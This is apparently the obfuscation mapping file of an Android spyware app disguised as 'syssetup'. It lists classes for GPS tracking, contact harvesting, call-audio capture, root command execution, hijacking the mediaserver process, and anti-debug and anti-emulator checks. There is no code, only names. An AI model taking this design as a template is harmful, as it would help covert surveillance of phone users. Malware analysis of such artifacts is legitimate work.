android.media.AmrInputStream -> android.media.AmrInputStream:
com.android.syssetup.module.position.GPSLocationListener -> stt.cx:
    void onLocationChanged(android.location.Location) -> onLocationChanged
com.android.syssetup.module.position.GPSLocator -> stt.cy:
    android.location.LocationManager lm -> jg
    android.location.LocationListener listener -> jh
    java.lang.String provider -> ji
    android.os.Looper myLooper -> jj
    byte[] $ -> end
    int $$ -> record
    void initLocationUpdates() -> ej
    49:54:void run() -> run
    61:62:void setListener(android.location.LocationListener) -> absolute
    65:65:android.location.Location getLastKnownPosition() -> ek
    69:78:void halt() -> bD
    84:94:void turnGPSOn() -> el
    100:110:void turnGPSOff() -> em
    116:137:boolean canToggleGPS() -> en
    141:145:boolean isGPSEnabled() -> eo
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.position.GPSLocatorAuto -> stt.cz:
    com.android.syssetup.module.position.GPSLocatorAuto instance -> jk
    java.util.ArrayList listeners$7865b31 -> jl
    com.android.syssetup.module.position.GPSLocatorPeriod locator -> jm
    long stopDelay -> jn
    boolean gotValidPosition -> jo
    boolean turnedOn -> jp
    37:49:com.android.syssetup.module.position.GPSLocatorAuto self() -> ep
    63:116:boolean start(com.android.syssetup.module.position.GPSLocationListener) -> absolute
    123:130:void unregister$2a5b3705(com.android.syssetup.action.SmsAction) -> absolute
    135:162:void stop() -> stop
    171:179:void run() -> run
    189:201:void onLocationChanged(android.location.Location) -> onLocationChanged
    208:208:void onProviderDisabled(java.lang.String) -> onProviderDisabled
    214:214:void onProviderEnabled(java.lang.String) -> onProviderEnabled
    220:220:void onStatusChanged(java.lang.String,int,android.os.Bundle) -> onStatusChanged
com.android.syssetup.module.position.GPSLocatorDistance -> stt.cA:
    float latitude -> jq
    float longitude -> jr
    float distance -> js
    com.android.syssetup.event.EventLocation rangeObserver$1f582f50$377cb50b -> jt
    android.location.Location location -> ju
    boolean entered -> ct
    45:46:void initLocationUpdates() -> ej
    49:81:void onLocationChanged(android.location.Location) -> onLocationChanged
    88:88:void onProviderDisabled(java.lang.String) -> onProviderDisabled
    94:94:void onProviderEnabled(java.lang.String) -> onProviderEnabled
    100:100:void onStatusChanged(java.lang.String,int,android.os.Bundle) -> onStatusChanged
com.android.syssetup.module.position.GPSLocatorPeriod -> stt.cB:
    int period -> dT
    27:28:void initLocationUpdates() -> ej
com.android.syssetup.module.task.Contact -> stt.cC:
    com.android.syssetup.module.task.UserInfo userInfo -> jv
    java.util.ArrayList emailInfo$7865b31 -> jw
    java.util.ArrayList paInfo$7865b31 -> jx
    java.util.ArrayList phoneInfo$7865b31 -> jy
    java.util.ArrayList imInfo$7865b31 -> jz
    java.util.ArrayList orgInfo$7865b31 -> jA
    java.util.ArrayList webInfo$7865b31 -> jB
    byte[] $ -> end
    int $$ -> record
    40:41:void add(com.android.syssetup.module.task.EmailInfo) -> absolute
    44:45:void add(com.android.syssetup.module.task.PostalAddressInfo) -> absolute
    48:49:void add(com.android.syssetup.module.task.PhoneInfo) -> absolute
    52:53:void add(com.android.syssetup.module.task.ImInfo) -> absolute
    56:57:void add(com.android.syssetup.module.task.OrganizationInfo) -> absolute
    60:61:void add(com.android.syssetup.module.task.WebsiteInfo) -> absolute
    64:64:com.android.syssetup.module.task.UserInfo getUserInfo() -> eq
    76:76:java.util.ArrayList getPhoneInfo$5679c1ce() -> er
    93:101:java.lang.String toString() -> toString
    105:173:java.lang.String getInfo() -> getInfo
    177:177:long getId() -> getId
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.task.EmailInfo -> stt.cD:
    long userId -> jC
    int emailType -> jD
    java.lang.String email -> jE
    30:30:int getEmailType() -> es
    34:34:java.lang.String getEmail() -> et
com.android.syssetup.module.task.ImInfo -> stt.cE:
    long userId -> jC
    int imType -> jF
    java.lang.String im -> jG
    30:30:int getImType() -> eu
    34:34:java.lang.String getIm() -> ev
com.android.syssetup.module.task.OrganizationInfo -> stt.cF:
    int userId -> jH
    int type -> type
    java.lang.String companyName -> jI
    java.lang.String companyTitle -> jJ
    32:32:int getType() -> getType
    36:36:java.lang.String getCompanyName() -> ew
    40:40:java.lang.String getCompanyTitle() -> ex
com.android.syssetup.module.task.PhoneInfo -> stt.cG:
    long userId -> jC
    int phoneType -> jK
    java.lang.String phoneNumber -> jL
    30:30:int getPhoneType() -> getPhoneType
    34:34:java.lang.String getPhoneNumber() -> reintroduce
com.android.syssetup.module.task.PickContact -> stt.cH:
    byte[] $ -> end
    30:52:void addUserPhones(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> absolute
    56:73:void addUserEmails(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> and
    77:111:void addUserInfos(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> array
    115:151:void addUserPA(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> asm
    155:176:void addUserIm(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> begin
    180:205:void addUserOrg(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> case
    209:230:void addUserWebsite(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> const
    233:251:java.util.Hashtable getContactInfo() -> ey
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.task.PostalAddressInfo -> stt.cI:
    long userId -> jC
    int type -> type
    java.lang.String street -> jM
    java.lang.String poBox -> jN
    java.lang.String neighbor -> jO
    java.lang.String city -> jP
    java.lang.String state -> jQ
    java.lang.String postalCode -> jR
    java.lang.String country -> jS
    39:39:int getType() -> getType
    43:43:java.lang.String getStreet() -> ez
    47:47:java.lang.String getPoBox() -> eA
    51:51:java.lang.String getNeighbor() -> eB
    55:55:java.lang.String getCity() -> eC
    59:59:java.lang.String getState() -> eD
    63:63:java.lang.String getPostalCode() -> getPostalCode
    67:67:java.lang.String getCountry() -> getCountry
com.android.syssetup.module.task.UserInfo -> stt.cJ:
    java.lang.String completeName -> jT
    java.lang.String userNote -> jU
    java.lang.String userNickname -> jV
    long userId -> jC
    26:26:java.lang.String getCompleteName() -> eE
    30:30:java.lang.String getUserNote() -> eF
    34:34:java.lang.String getUserNickname() -> eG
    38:38:long getUserId() -> eH
com.android.syssetup.module.task.WebsiteInfo -> stt.cK:
    long userId -> jC
    java.lang.String websiteName -> jW
    28:28:java.lang.String getWebsiteName() -> eI
com.android.syssetup.optimize.SetupSystem -> com.android.syssetup.optimize.SetupSystem:
    android.content.Context context -> D
    boolean stop -> az
    long BeforeTime -> jX
    byte[] $ -> end
    24:30:void start(int) -> operator
    43:70:boolean isNotOptimized() -> eJ
    74:87:boolean getResults(long[]) -> array
    14:14:long access$002(com.android.syssetup.optimize.SetupSystem,long) -> absolute
    14:14:long access$000(com.android.syssetup.optimize.SetupSystem) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.optimize.SetupSystem$1 -> stt.cL:
    java.lang.String val$host -> jY
    com.android.syssetup.optimize.SetupSystem this$0 -> jZ
    50:64:void run() -> run
com.android.syssetup.util.AntiDebug -> stt.cM:
    byte[] $ -> end
    15:19:boolean checkFlag() -> eK
    38:38:boolean checkConnected() -> eL
    47:47:boolean isDebug() -> eM
    51:63:boolean isPlayStore() -> eN
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.util.AntiEmulator -> stt.cN:
    int NUMTESTSTM -> ka
    int NUMTESTSNOTM -> kb
    android.telephony.TelephonyManager tm -> kc
    byte[] $ -> end
    int $$ -> record
    24:53:int checkKeys() -> eO
    58:71:int checkTags() -> eP
    76:87:int checkProduct() -> eQ
    92:103:int checkDevice() -> eR
    108:125:int checkBrand() -> eS
    129:148:int checkScaling() -> eT
    153:166:int checkManufacturer() -> eU
    171:188:int checkId() -> eV
    193:211:int checkSubscriber() -> eW
    216:229:int checkOperator() -> eX
    234:263:int checkPhoneNumber() -> eY
    267:294:int isEmu(int) -> or
    298:302:int isEmu(int[]) -> absolute
    310:313:boolean isEmu() -> eZ
    319:330:boolean isTestEmu() -> fa
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.util.AudioEncoder -> stt.cO:
    java.lang.String audioDirectory -> kd
    java.lang.String audioStorage -> ke
    boolean call_finished -> kf
    int last_epoch -> kg
    int first_epoch -> kh
    int data_size -> ki
    int sampleRate -> kj
    java.lang.String rawFile -> kk
    byte[] rawPcm -> kl
    byte[] $ -> end
    49:111:int getInferredSampleRate() -> fb
    116:163:boolean encodetoAmr(java.lang.String,byte[]) -> and
    169:201:byte[] resample(boolean) -> interface
    205:336:byte[] decodeRawChunks() -> fc
    342:355:void removeRawFile() -> fd
    361:361:int getCallStartTime() -> fe
    365:365:int getCallEndTime() -> ff
    373:373:int getAllegedSampleRate() -> fg
    377:377:boolean isLastCallFinished() -> fh
    382:397:boolean createAudioStorage() -> fi
    402:406:java.lang.String getAudioStorage() -> fj
    410:422:boolean deleteAudioStorage() -> fk
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.util.CallBack -> stt.cP:
    java.util.ArrayList callbacks$7865b31 -> km
    13:14:void register$5dae15ba(com.android.syssetup.module.ModuleCall$HC) -> absolute
    17:22:void trigger$5d527811$552c4e01() -> fl
com.android.syssetup.util.DataBuffer -> stt.cQ:
    java.nio.ByteBuffer byteBuffer -> kn
    65:65:int readInt() -> readInt
    76:76:long readLong() -> readLong
    88:89:void read(byte[]) -> type
    102:103:void write(byte[]) -> write
    112:113:void writeInt(int) -> writeInt
    122:123:void writeLong(long) -> writeLong
    126:128:void writeDouble(double) -> writeDouble
    131:132:void writeFloat(float) -> writeFloat
    135:136:void writeByte(byte) -> writeByte
    139:140:void writeShort(short) -> writeShort
com.android.syssetup.util.DateTime -> stt.cR:
    long ticks -> ko
    java.util.Date date -> cm
    103:110:java.util.Date getDate() -> getDate
    123:123:long getFiledate() -> fm
    141:172:byte[] getStructTm() -> fn
    193:194:int hiDateTime() -> fo
    203:204:int lowDateTime() -> fp
    214:214:java.lang.String toString() -> toString
    225:229:long getFiledate(java.util.Date) -> and
    238:259:byte[] getStructSystemdate() -> fq
com.android.syssetup.util.Execute -> stt.cS:
    byte[] $ -> end
    int $$ -> record
    24:34:com.android.syssetup.util.ExecuteResult executeRoot(java.lang.String) -> pz
    95:125:com.android.syssetup.util.ExecuteResult executeSimple(java.lang.String) -> pA
    129:173:com.android.syssetup.util.ExecuteResult execute(java.lang.String) -> pB
    177:226:com.android.syssetup.util.ExecuteResult execute(java.lang.String[]) -> absolute
    233:240:boolean executeWaitFor(java.lang.String) -> pC
    245:260:boolean executeRootAndForgetScript(java.lang.String) -> pD
    264:302:com.android.syssetup.util.ExecuteResult executeScript(java.lang.String) -> pE
    307:308:void chmod(java.lang.String,java.lang.String) -> file
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.util.ExecuteResult -> stt.cT:
    int exitCode -> kp
    java.util.ArrayList stdout -> kq
    java.util.ArrayList stderr -> kr
    java.lang.String executionLine -> ks
    23:23:java.lang.String getStdout() -> fr
    31:38:java.lang.String listToString(java.util.ArrayList) -> const
    46:58:void saveEvidence() -> fs
com.android.syssetup.util.Instrument -> stt.cU:
    java.lang.String proc -> kt
    com.android.syssetup.util.Instrument$MediaserverMonitor pidMonitor -> ku
    java.lang.String lib -> kv
    java.lang.String hijacker -> kw
    java.lang.String path -> kx
    java.lang.String dumpPath -> ky
    java.lang.String pidCompletePath -> kz
    java.lang.String pidFile -> kA
    boolean stopMonitor -> kB
    java.lang.Thread monitor -> kC
    int killed -> kD
    java.lang.String lid -> kE
    byte[] $ -> end
    int $$ -> record
    47:51:boolean deleteHijacker() -> ft
    56:79:boolean installHijacker() -> fu
    83:194:boolean startInstrumentation() -> fv
    198:200:void stopInstrumentation() -> fw
    204:232:int getProcessPid() -> fx
    237:247:void killProc() -> fy
    18:18:boolean access$000(com.android.syssetup.util.Instrument) -> absolute
    18:18:boolean access$002$7fdbc4e9(com.android.syssetup.util.Instrument) -> and
    18:18:int access$100(com.android.syssetup.util.Instrument) -> array
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.util.Instrument$MediaserverMonitor -> stt.cU$absolute:
    int cur_pid -> kF
    int start_pid -> kG
    int failedCounter -> kH
    com.android.syssetup.util.Instrument this$0 -> kI
    254:255:void setPid(int) -> packed
    269:298:void run() -> run
com.android.syssetup.util.PackageUtils -> stt.cV:
    byte[] $ -> end
    265:295:java.util.ArrayList getInstalledApps$2a667459() -> fz
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.util.PackageUtils$PInfo -> stt.cV$absolute:
    java.lang.String appname -> kJ
    java.lang.String pname -> kK
    java.lang.String versionName -> versionName
    java.lang.String apkPath -> kL
    int versionCode -> versionCode
    191:191:java.lang.String toString() -> toString
    158:158:java.lang.String access$000(com.android.syssetup.util.PackageUtils$PInfo) -> absolute
    158:158:java.lang.String access$002(com.android.syssetup.util.PackageUtils$PInfo,java.lang.String) -> absolute
    158:158:java.lang.String access$102(com.android.syssetup.util.PackageUtils$PInfo,java.lang.String) -> and
    158:158:java.lang.String access$202(com.android.syssetup.util.PackageUtils$PInfo,java.lang.String) -> array
    158:158:int access$302(com.android.syssetup.util.PackageUtils$PInfo,int) -> absolute
    158:158:java.lang.String access$402(com.android.syssetup.util.PackageUtils$PInfo,java.lang.String) -> asm
com.android.syssetup.util.Utils -> stt.cW:
    java.security.SecureRandom rand -> kM
    55:68:void sleep(int) -> procedure
    81:81:long getRandom() -> fA
    85:89:int[] getRandomIntArray$2558076() -> fB
    93:98:byte[] getRandomByteArray$486860e8() -> fC
    107:107:long getTimeStamp() -> fD
    112:124:byte[] concat(byte[][]) -> absolute
